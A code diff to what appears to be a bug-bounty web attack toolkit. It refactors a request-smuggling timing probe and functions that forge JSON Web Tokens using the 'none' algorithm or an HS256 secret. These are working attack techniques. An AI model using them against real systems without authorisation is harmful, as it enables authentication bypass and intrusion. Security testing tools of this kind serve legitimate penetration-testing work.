@@ -7,14 +7,16 @@ Bug Bounty Hunter Edition - Termux Non-Root Compatible
 import re
 import json
 import time
+import hmac
 import base64
 import hashlib
+import random
 import requests
 from urllib.parse import urlparse, urljoin, quote
 from concurrent.futures import ThreadPoolExecutor, as_completed
+from bs4 import BeautifulSoup
 
 from core.var import USER_AGENTS, DEFAULT_TIMEOUT, VERIFY_SSL
-import random
 
 
 class AdvancedWebAttacks:
@@ -180,7 +182,7 @@ class AdvancedWebAttacks:
                 start = time.time()
                 try:
                     self.session.post(url, headers=headers, data='5\r\nGPOST\r\n0\r\n\r\n', timeout=15, verify=VERIFY_SSL)
-                except:
+                except Exception:
                     pass
                 elapsed = time.time() - start
 
@@ -446,8 +448,9 @@ class AdvancedWebAttacks:
     def _forge_jwt_none(self, header, payload):
         """Forge JWT with none algorithm"""
         try:
-            header['alg'] = 'none'
-            header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
+            header_copy = dict(header)
+            header_copy['alg'] = 'none'
+            header_b64 = base64.urlsafe_b64encode(json.dumps(header_copy).encode()).rstrip(b'=').decode()
             payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
             return f"{header_b64}.{payload_b64}."
         except Exception:
@@ -456,12 +459,12 @@ class AdvancedWebAttacks:
     def _forge_jwt_hs256(self, header, payload, secret):
         """Forge JWT with HS256 using a secret"""
         try:
-            header['alg'] = 'HS256'
-            header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
+            header_copy = dict(header)
+            header_copy['alg'] = 'HS256'
+            header_b64 = base64.urlsafe_b64encode(json.dumps(header_copy).encode()).rstrip(b'=').decode()
             payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
             message = f"{header_b64}.{payload_b64}"
 
-            import hmac
             signature = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
             signature_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()
 
